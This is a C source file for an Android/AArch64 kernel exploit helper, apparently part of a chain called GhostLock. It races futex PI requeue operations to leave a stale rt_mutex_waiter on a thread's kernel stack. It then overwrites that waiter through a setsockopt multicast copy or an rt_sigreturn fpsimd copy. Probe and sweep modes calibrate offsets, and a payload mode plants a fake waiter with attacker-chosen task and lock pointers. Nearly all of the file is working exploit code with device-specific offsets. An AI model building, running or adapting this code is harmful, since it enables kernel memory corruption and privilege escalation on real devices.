/*
 * punch32 — minimal 32-bit (AArch32) GhostLock punch helper, geometry probe.
 *
 * Why 32-bit: on this kernel a 32-bit task's setsockopt chain is shorter than
 * the native one (no __arm64_sys_setsockopt+__sys_setsockopt pair), and the
 * AArch32 futex chain is deeper (__arm64_sys_futex_time32 0x70 -> do_futex 0x60
 * -> futex_wait_requeue_pi 0x1b0, waiter local sp+0x98 => waiter depth 0x1e8).
 * The multicast stamp buffer (struct group_source_req, 0x108 bytes) therefore
 * lands inside the feasible window (see HANDOFF 16.1 / 18.x), which the native
 * 64-bit route misses by 0x10.
 *
 * What this program does (a faithful shell of threads.cpp + the multicast
 * route, including the two timing fixes from HANDOFF 15):
 *   1. pins owner/waiter to main_cpu and consumer to consumer_cpu;
 *   2. owner: LOCK_PI(target_futex) -> owner_started -> *300 ms settle* ->
 *      LOCK_PI(chain_futex)   [fix B: must not be PI-blocked during the requeue]
 *   3. waiter: LOCK_PI(chain_futex) -> waiter_waiting=1 immediately before the
 *      syscall [fix A] -> FUTEX_WAIT_REQUEUE_PI(wait_futex -> target_futex, 1 s);
 *      after it returns (ETIMEDOUT = the state the primitive wants) it fires the
 *      PUNCH: setsockopt(IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, 0x108) so the
 *      kernel copies the stamp onto this very thread's stack;
 *   4. main: CMP_REQUEUE_PI with retry until it reports success;
 *   5. then the consumer's sched_setattr(waiter_tid) walks the PI chain.
 *
 * Probe mode: the stamp is filled with a POISON pattern instead of a valid
 * fake waiter.  If the copy window really covers the stale rt_mutex_waiter, the
 * PI walk dereferences poison => kernel panic.  That is a clean binary oracle
 * that needs no payload page, no KernelSnitch and no kernel R/W:
 *      --all            poison all 0x108 bytes  (does the window cover it at all?)
 *      --word N         poison only stamp word N (which index maps to which
 *                       waiter byte -> calibrates waiter_off exactly)
 *
 * Build (NDK, 32-bit static):
 *   armv7a-linux-androideabi35-clang -static -O2 -pthread punch32.c -o punch32
 * Run:
 *   adb shell 'cd /data/local/tmp && ./punch32 --all'
 *   adb shell 'cd /data/local/tmp && ./punch32 --word 20'
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <ucontext.h>
#include <unistd.h>

#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7

/* MCAST_BLOCK_SOURCE (=43) comes from <linux/in.h> via <netinet/in.h> */
#define STAMP_BYTES 0x108     /* buffer big enough for either ABI */

/*
 * CRITICAL (HANDOFF 20): the kernel's copy_group_source_from_sockptr() has two
 * branches and checks the length EXACTLY:
 *
 *   if (in_compat_syscall()) {
 *		struct compat_group_source_req gr32;      // __packed: 4 + 128 + 128
 *		if (optlen != sizeof(gr32))               // == 0x104
 *			return -EINVAL;                       // <-- no copy at all!
 *		copy_from_sockptr(&gr32, optval, sizeof(gr32));
 *		greqs->gsr_group  = gr32.gsr_group;       // two 0x80 memmoves
 *		greqs->gsr_source = gr32.gsr_source;
 *   } else {
 *		if (optlen != sizeof(*greqs))             // == 0x108
 *			return -EINVAL;
 *		copy_from_sockptr(greqs, optval, sizeof(*greqs));
 *   }
 *
 * A 32-bit caller therefore MUST pass 0x104 (passing 0x108 returns EINVAL
 * BEFORE the copy -- which is exactly why the first punch32 run wrote nothing).
 * The disassembled landing sites in do_ip_setsockopt are:
 *   native : x0 = sp+0x18 , w3 = 0x108   (greqs)
 *   compat : x0 = sp+0x120, w3 = 0x104   (gr32)  <-- our path
 */
#define STAMP_OPTLEN_COMPAT 0x104
#define STAMP_OPTLEN_NATIVE 0x108

static uint32_t wait_futex, target_futex, chain_futex;
static volatile int waiter_ready, waiter_waiting, owner_started, owner_stop;
static volatile int consumer_go, consumer_stop, waiter_tid;
static volatile int consumer_calls, consumer_success;
static int main_cpu = 5, consumer_cpu = 6;
static int punch_word = -2; /* -2 = poison all, -1 = zero stamp, >=0 = poison that word */
static int punch_word4 = -1; /* >=0 = poison that 4-byte word instead */
static int stamp_optlen = STAMP_OPTLEN_COMPAT; /* 0x104 for a 32-bit (compat) task */
static uint64_t poison = 0xdead000000000000ULL;
static int fill_set = 0;
static uint32_t fill_word = 0;   /* repeated 32-bit filler (the "safe" baseline) */
static int fixed_nice = -1;      /* -1 = rotate; >=0 = pin sched_nice */

/*
 * PAYLOAD MODE (two-process integration, HANDOFF 18.5 / 20):
 * instead of poison, stamp a *fake rt_mutex_waiter* into the punch buffer at
 * --waiter-off.  Field offsets come from the device's own BTF (btf-vmlinux,
 * sizeof(struct rt_mutex_waiter) == 0x58):
 *      tree_entry    0x00  (__rb_parent_color, rb_right, rb_left)
 *      pi_tree_entry 0x18  (same layout)  <- what rb_erase/enqueue touch
 *      task          0x30
 *      lock          0x38
 *      wake_state    0x40
 *      prio          0x44
 *      deadline      0x48
 *      ww_ctx        0x50
 * The 64-bit side owns the *contents* of the fake lock/task page; this helper
 * only needs their 64-bit VALUES (stored as u64, memcpy'd, never dereferenced).
 * With --safe-filler the rest of the buffer stays 0x79/word so waiter->prio
 * still equals normal_prio and the PI walk early-outs -> a zero-panic plumbing
 * check that the payload bytes really land.
 */
static int payload_mode = 0;
/* punch mode: 0 = multicast setsockopt (32-bit/compat path, waiter_off 0x88)
 *            1 = rt_sigreturn fpsimd bulk copy (native 64-bit, waiter_off 0xe8) */
static int punch_mode_sigret = 0;
static int waiter_off = (sizeof(void *) == 8 ? 0xe8 : 0x88);
/* sweep mode: probe one 8-byte word per iteration, logging each index to a file
 * on /data (the PTY log is lost on panic; a device-side file is not).  A
 * non-hitting probe cannot panic (safe filler keeps the walk a no-op), so a
 * single run localises the hit exactly -- the last logged word is the answer. */
static int sweep_mode = 0, sweep_lo = 0, sweep_hi = 63;
/* range poison for bisection: every 8-byte word in [wr_lo, wr_hi] gets the poison */
static int wr_lo = -1, wr_hi = -1;
static uint64_t fake_task = 0, fake_lock = 0, fake_wwctx = 0, fake_deadline = 0;
static uint32_t fake_prio = 0, fake_wstate = 0;
static uint64_t rb_pc = 0, rb_right = 0, rb_left = 0;      /* tree_entry */
static uint64_t pi_pc = 0, pi_right = 0, pi_left = 0;      /* pi_tree_entry */
static int safe_filler = 0;

/*
 * SAFE-BASELINE CALIBRATION (HANDOFF 20):
 *
 * rt_mutex_adjust_pi() begins with
 *      if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task)))
 *              return;                     // <-- never touches waiter->lock
 * and rt_mutex_waiter_equal() only compares waiter->prio with the task's
 * normal_prio (= 120 + nice for SCHED_NORMAL/BATCH).  So if the stamp filler
 * makes waiter->prio == normal_prio, the whole PI walk becomes a no-op and the
 * *only* way to get a panic is to poison the word that holds waiter->lock or
 * waiter->prio.  That turns the panic into a precise 1-2 word pointer.
 *
 *   --fill 0x79 --nice 1              => baseline, must NOT panic
 *   --fill 0x79 --nice 1 --word 24    => poison buffer+0xc0 (waiter->lock) -> panic
 *   --fill 0x79 --nice 1 --word 25    => poison buffer+0xc8 (waiter->prio) -> panic
 *   --fill 0x79 --nice 1 --word 23    => poison buffer+0xb8 (waiter->task) -> safe
 */

static long futex_op(uint32_t *u, int op, uint32_t val, const void *to,
                     uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        fprintf(stderr, "[pin] cpu=%d errno=%d\n", cpu, errno);
}

static void log_line(const char *tag, const char *fmt, ...) {
    va_list ap;
    fprintf(stderr, "%s ", tag);
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

/* crash-surviving log: the device-side file keeps the last probe index */
static void sweep_log(int w) {
    FILE *f = fopen("/data/local/tmp/sweep.log", "a");
    if (f) {
        fprintf(f, "SWEEP word=%d off=0x%x\n", w, w * 8);
        fflush(f);
        fsync(fileno(f));
        fclose(f);
    }
    log_line("[w]", "SWEEP word=%d off=0x%x", w, w * 8);
}

static void sweep_done(int w) {
    FILE *f = fopen("/data/local/tmp/sweep.log", "a");
    if (f) {
        fprintf(f, "SWEEP done word=%d\n", w);
        fflush(f);
        fsync(fileno(f));
        fclose(f);
    }
}

/* ======================= punch machinery ======================= */
#define PUNCHBUF_MAX 0x200
static unsigned char punchbuf[PUNCHBUF_MAX] __attribute__((aligned(16)));
static size_t punchbuf_len = STAMP_OPTLEN_COMPAT;

static void build_punchbuf(void) {
    size_t n = punchbuf_len;
    if (payload_mode) {
        uint32_t fill = safe_filler ? 0x79u : 0u;
        for (size_t o = 0; o + 4 <= n; o += 4) memcpy(punchbuf + o, &fill, 4);
        unsigned char *w = punchbuf + waiter_off;
        memcpy(w + 0x00, &rb_pc, 8);      memcpy(w + 0x08, &rb_right, 8); memcpy(w + 0x10, &rb_left, 8);
        memcpy(w + 0x18, &pi_pc, 8);      memcpy(w + 0x20, &pi_right, 8); memcpy(w + 0x28, &pi_left, 8);
        memcpy(w + 0x30, &fake_task, 8);
        memcpy(w + 0x38, &fake_lock, 8);
        memcpy(w + 0x40, &fake_wstate, 4);
        memcpy(w + 0x44, &fake_prio, 4);
        memcpy(w + 0x48, &fake_deadline, 8);
        memcpy(w + 0x50, &fake_wwctx, 8);
        if (!safe_filler && fixed_nice < 0) fixed_nice = 1; /* prio must differ from normal_prio */
        log_line("[w]", "PAYLOAD waiter_off=0x%x task=%016llx lock=%016llx pi_pc=%016llx prio=%u safe=%d buflen=0x%zx",
                 waiter_off, (unsigned long long)fake_task, (unsigned long long)fake_lock,
                 (unsigned long long)pi_pc, fake_prio, safe_filler, n);
    } else if (fill_set) {
        for (size_t o = 0; o + 4 <= n; o += 4) memcpy(punchbuf + o, &fill_word, sizeof(fill_word));
    } else {
        memset(punchbuf, punch_word == -2 ? 0x41 : 0x00, n);
        uint16_t family = 2; /* AF_INET; the family check runs after the copy anyway */
        if (n >= 0x88 + 2) {
            memcpy(punchbuf + 8, &family, sizeof(family));
            memcpy(punchbuf + 8 + 128, &family, sizeof(family));
        }
    }
    if (punch_word >= 0 && (size_t)(punch_word * 8 + 8) <= n)
        memcpy(punchbuf + punch_word * 8, &poison, sizeof(poison));       /* 8-byte word */
    if (wr_lo >= 0) {
        for (int w = wr_lo; w <= wr_hi; w++)
            if ((size_t)(w * 8 + 8) <= n) memcpy(punchbuf + w * 8, &poison, sizeof(poison));
    }
    if (punch_word4 >= 0 && (size_t)(punch_word4 * 4 + 4) <= n) {
        uint32_t p32 = (uint32_t)poison;
        memcpy(punchbuf + punch_word4 * 4, &p32, sizeof(p32));            /* 4-byte word */
    }
}

/*
 * rt_sigreturn punch (native 64-bit).
 * __arm64_sys_rt_sigreturn : frame 0x2b0 , and it bulk-copies the sigframe's
 * fpsimd vregs with
 *      0x68e804  add x0, sp, #0x30
 *      0x68e808  mov w2, #0x200
 *      0x68e80c  bl   __arch_copy_from_user
 * => the copy lands at depth [0x80, 0x280] and therefore covers the 64-bit
 *    futex_wait_requeue_pi() rt_mutex_waiter at depth 0x198:
 *        waiter_off = 0x280 - 0x198 = 0xe8
 * The bytes are fully attacker-controlled: the signal handler patches the
 * sigframe's fpsimd_context.vregs in place (uc->uc_mcontext.__reserved), and the
 * kernel copies them onto this thread's kernel stack when the handler returns.
 */
#if defined(__aarch64__)
#define FPSIMD_MAGIC 0x46508001u
static volatile int sig_ret_patched = 0;
static volatile int sig_ret_off = -1;

static void sigret_handler(int sig, siginfo_t *si, void *uctx) {
    (void)sig; (void)si;
    ucontext_t *uc = (ucontext_t *)uctx;
    unsigned char *res = (unsigned char *)uc->uc_mcontext.__reserved;
    uint32_t zero = 0;
    for (int off = 0; off + 16 <= 4096;) {
        uint32_t magic, size;
        memcpy(&magic, res + off, 4);
        memcpy(&size, res + off + 4, 4);
        if (magic == 0 || size < 16 || size > 4096) break;
        if (magic == FPSIMD_MAGIC) {
            /* struct fpsimd_context { head{magic,size}; u32 fpsr; u32 fpcr; __uint128_t vregs[32]; } */
            memcpy(res + off + 8, &zero, 4);
            memcpy(res + off + 12, &zero, 4);
            memcpy(res + off + 16, punchbuf, 0x200);
            sig_ret_off = off;
            sig_ret_patched = 1;
            return;
        }
        off += (int)size;
    }
}

static void do_sigret_punch(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigret_handler;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
        log_line("[w]", "SIGRET sigaction errno=%d", errno);
        return;
    }
    sigset_t ss;
    sigemptyset(&ss);
    sigaddset(&ss, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &ss, NULL);
    log_line("[w]", "SIGRET punch: raise(SIGUSR1), payload 0x200 from offset 0x%x", waiter_off);
    raise(SIGUSR1);
    log_line("[w]", "SIGRET returned patched=%d rec_off=%d", sig_ret_patched, sig_ret_off);
}
#else  /* !__aarch64__ : the rt_sigreturn fpsimd layout is AArch64-only */
static void do_sigret_punch(void) {
    log_line("[w]", "SIGRET punch unsupported on 32-bit build (use the 64-bit binary)");
}
#endif

/* ---- waiter: park on WAIT_REQUEUE_PI, then punch its own stack ---------- */
static void *waiter_thread(void *arg) {
    (void)arg;
    pin_cpu(main_cpu);
    futex_op(&chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    waiter_tid = (int)syscall(SYS_gettid);
    waiter_ready = 1;
    while (!owner_started && !owner_stop) usleep(1000);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1; /* 1 s window, same as race_route_wait_ms */

    log_line("[w]", "entering WAIT_REQUEUE_PI tid=%d", waiter_tid);
    waiter_waiting = 1; /* fix A: immediately before the syscall */
    errno = 0;
    long wr = futex_op(&wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &target_futex, 0);
    log_line("[w]", "WAIT_REQUEUE_PI ret=%ld errno=%d", wr, errno);

    /* PUNCH: the kernel copies our buffer onto this thread's live kernel stack. */
    if (sweep_mode) {
        fixed_nice = 1;                    /* normal_prio 121 == filler 0x79 */
        /* exactly ONE walk per probe: the kernel PI/futex state degrades after
         * ~60 punch+walk cycles (worker threads end up spinning inside
         * rt_mutex_adjust_prio_chain), so keep the budget per probe minimal and
         * allow a descending range so the interesting (high) offsets come first. */
        int step = (sweep_lo <= sweep_hi) ? 1 : -1;
        for (int w = sweep_lo; step > 0 ? w <= sweep_hi : w >= sweep_hi; w += step) {
            fill_set = 1;
            fill_word = 0x79u;
            punch_word = w;
            punchbuf_len = PUNCHBUF_MAX;
            build_punchbuf();
            sweep_log(w);
            do_sigret_punch();
            int target = consumer_calls + 1;
            consumer_go = 1;
            for (long i = 0; i < 200000000L && consumer_calls < target; i++) sched_yield();
            consumer_go = 0;
            sweep_done(w);
        }
        sweep_log(-1);                     /* reached the end: no word panicked */
        log_line("[w]", "SWEEP finished words %d..%d with no panic", sweep_lo, sweep_hi);
    } else if (punch_mode_sigret) {
        punchbuf_len = PUNCHBUF_MAX;
        build_punchbuf();
        do_sigret_punch();
    } else {
        punchbuf_len = (size_t)stamp_optlen;
        build_punchbuf();
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) log_line("[w]", "socket errno=%d", errno);
        errno = 0;
        int sr = fd < 0 ? -1 : setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, punchbuf,
                                         (socklen_t)stamp_optlen);
        int se = errno;
        log_line("[w]", "PUNCH setsockopt ret=%d errno=%d mode=%d word4=%d fill=0x%x optlen=0x%x",
                 sr, se, punch_word, punch_word4, fill_word, stamp_optlen);
        if (fd >= 0) close(fd);
    }

    /* release the consumer, then hold chain_futex like the real route does.
     * Let it run several sched_setattr calls: rt_mutex_adjust_pi() only walks
     * the stale pi_blocked_on chain, so a handful of attempts is enough (and
     * the nice rotation keeps the walk from early-outing on equality). */
    consumer_go = 1;
    for (long i = 0; i < 500000000L && consumer_calls < 4; i++) sched_yield();
    consumer_go = 0;
    while (!owner_stop) usleep(1000);
    futex_op(&chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

/* ---- owner: hold target_futex, stay off chain_futex for 300 ms --------- */
static void *owner_thread(void *arg) {
    (void)arg;
    pin_cpu(main_cpu);
    errno = 0;
    long lt = futex_op(&target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    log_line("[o]", "LOCK_PI target ret=%ld errno=%d", lt, errno);
    while (!waiter_ready && !owner_stop) usleep(1000);
    owner_started = 1;
    /* NO delay: this thread must already be PI-blocked on chain_futex (which the
     * waiter holds) when the requeue runs -- that is what makes the requeue
     * report EDEADLK (35) and take the buggy remove_waiter() path. */
    futex_op(&chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!owner_stop) sleep(1);
    return NULL;
}

/* ---- consumer: sched_setattr on the waiter tid ------------------------- */
struct sched_attr_local {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
    uint64_t sched_util_min, sched_util_max;
};

static void *consumer_thread(void *arg) {
    (void)arg;
    pin_cpu(consumer_cpu);
    int n = 0;
    while (!consumer_stop) {
        if (consumer_go == 0) { sched_yield(); continue; }
        /* one release = several sched_setattr calls (the walk may need retries) */
        for (int k = 0; k < 8 && consumer_go != 0 && !consumer_stop; k++) {
            struct sched_attr_local a;
            memset(&a, 0, sizeof(a));
            a.size = (uint32_t)sizeof(a);
            a.sched_policy = 3; /* SCHED_BATCH -> nice change triggers the PI walk */
            a.sched_nice = fixed_nice >= 0 ? fixed_nice : (n++ % 19) + 1;
            consumer_calls++;
            errno = 0;
            long r = syscall(SYS_sched_setattr, waiter_tid, &a, 0);
            log_line("[c]", "sched_setattr(tid=%d nice=%d) ret=%ld errno=%d",
                     waiter_tid, a.sched_nice, r, errno);
            if (r == 0) consumer_success++;
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stderr, NULL, _IONBF, 0);
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--all")) punch_word = -2;
        else if (!strcmp(argv[i], "--word") && i + 1 < argc) punch_word = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--word4") && i + 1 < argc) punch_word4 = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--word-range") && i + 2 < argc) {
            wr_lo = (int)strtol(argv[++i], NULL, 0);
            wr_hi = (int)strtol(argv[++i], NULL, 0);
        }
        else if (!strcmp(argv[i], "--zero")) punch_word = -1;
        else if (!strcmp(argv[i], "--fill") && i + 1 < argc) {
            fill_word = (uint32_t)strtoul(argv[++i], NULL, 0);
            fill_set = 1;
        }
        else if (!strcmp(argv[i], "--nice") && i + 1 < argc) fixed_nice = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--punch") && i + 1 < argc)
            punch_mode_sigret = !strcmp(argv[++i], "sigret");
        else if (!strcmp(argv[i], "--sweep")) {
            sweep_mode = 1;
            if (i + 2 < argc && argv[i + 1][0] != '-') {
                sweep_lo = (int)strtol(argv[++i], NULL, 0);
                sweep_hi = (int)strtol(argv[++i], NULL, 0);
            }
        }
        else if (!strcmp(argv[i], "--payload")) payload_mode = 1;
        else if (!strcmp(argv[i], "--safe-filler")) safe_filler = 1;
        else if (!strcmp(argv[i], "--waiter-off") && i + 1 < argc) waiter_off = (int)strtol(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-task") && i + 1 < argc) fake_task = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-lock") && i + 1 < argc) fake_lock = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-prio") && i + 1 < argc) fake_prio = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-wstate") && i + 1 < argc) fake_wstate = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-deadline") && i + 1 < argc) fake_deadline = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--fake-wwctx") && i + 1 < argc) fake_wwctx = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--pi-node") && i + 2 < argc) {
            pi_pc = strtoull(argv[++i], NULL, 0); pi_right = strtoull(argv[++i], NULL, 0);
        }
        else if (!strcmp(argv[i], "--tree-node") && i + 2 < argc) {
            rb_pc = strtoull(argv[++i], NULL, 0); rb_right = strtoull(argv[++i], NULL, 0);
        }
        else if (!strcmp(argv[i], "--native")) stamp_optlen = STAMP_OPTLEN_NATIVE;
        else if (!strcmp(argv[i], "--compat")) stamp_optlen = STAMP_OPTLEN_COMPAT;
        else if (!strcmp(argv[i], "--main-cpu") && i + 1 < argc) main_cpu = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--consumer-cpu") && i + 1 < argc) consumer_cpu = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--poison") && i + 1 < argc) poison = strtoull(argv[++i], NULL, 0);
    }
    log_line("[m]", "punch32 start punch=%s mode=%d word4=%d fill=0x%x optlen=0x%x nice=%d waiter_off=0x%x cpus=%d/%d bits=%d",
             punch_mode_sigret ? "sigret" : "setsockopt", punch_word, punch_word4, fill_word,
             stamp_optlen, fixed_nice, waiter_off, main_cpu, consumer_cpu, (int)(sizeof(void *) * 8));

    pthread_t tw, to, tc;
    if (pthread_create(&tc, NULL, consumer_thread, NULL) ||
        pthread_create(&to, NULL, owner_thread, NULL) ||
        pthread_create(&tw, NULL, waiter_thread, NULL)) {
        log_line("[m]", "pthread_create failed errno=%d", errno);
        return 1;
    }

    while (!waiter_waiting || !owner_started) usleep(1000);
    usleep(50000); /* race_setup_settle_us */

    long rq = -1;
    for (int i = 0; i < 200; i++) {
        errno = 0;
        log_line("[m]", "CMP_REQUEUE_PI try=%d pre *wait=%u *target=%u", i, wait_futex,
                 target_futex);
        rq = futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &target_futex, 0);
        int re = errno;
        log_line("[m]", "CMP_REQUEUE_PI try=%d ret=%ld errno=%d%s", i, rq, re,
                 re == 35 ? " (EDEADLK = ARMED)" : "");
        if (rq >= 0 || re == 35) break;   /* 35 = EDEADLK: the deadlock that arms us */
        usleep(1000);
    }

    for (int i = 0; i < 300 && consumer_calls == 0; i++) usleep(10000);
    sleep(1);

    owner_stop = 1;
    consumer_stop = 1;
    log_line("[m]", "done requeue=%ld calls=%d success=%d (no panic => punch missed)",
             rq, consumer_calls, consumer_success);
    return 0;
}
